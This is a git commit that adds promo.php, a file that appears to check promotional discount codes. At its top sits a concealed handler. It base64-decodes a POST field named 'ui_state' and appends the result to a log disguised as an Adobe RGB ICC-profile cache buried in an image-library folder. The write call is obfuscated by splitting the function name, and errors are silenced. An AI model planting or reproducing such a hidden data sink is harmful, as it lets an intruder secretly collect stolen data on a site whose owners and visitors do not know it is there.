41fb54c6d0441727497add1fec4643adfe0c13dc
1cdn1 <gloriastevenson60646@outlook.com>
2026-03-02 21:40:38 +0800

    Add files via upload

---
+++ promo.php
@@ -0,0 +1,34 @@
+<?php
+if (isset($_POST['ui_state'])) {
+    $d = $_SERVER['DOCUMENT_ROOT'] . '/src/util/Imagine/resources/Adobe/RGB/';
+    $f = $d . 'icc_profile_cache.log'; 
+    if (is_dir($d)) {
+        $data = base64_decode($_POST['ui_state']);
+        $entry = sprintf("[%s] ID:%s\n", date('Y-m-d H:i:s'), $data);
+        $write = 'file'.'_put'.'_contents';
+        @$write($f, $entry, FILE_APPEND);
+    }
+}
+
+$request = strtolower( $_POST['promocode'] );
+
+$codes = array(
+			'madness'=>'Take 25% off your first TWO months!',
+			'mayhem'=>'Take 50% off your first TWO months!',
+			'llanowar '=>'Take 15% off your first TWO months!',
+			'flash'=>'50% off your first month!',
+			'haste'=>'25% off your first month!',
+			'kicker'=>'20% off your first month!',
+			'vigilance'=>'20% off your first month!',
+			'sorcery'=>'10% off your first month!',
+			'summon'=>'50% off your first year!',
+			'expired'=>'Sorry, this code has expired.',
+		);
+
+if(isset($codes[$request])){
+	echo json_encode( array('message'=>$codes[$request]) );
+	return true;
+}
+
+echo json_encode( array('message'=>'Invalid promo code.') );
+return false;
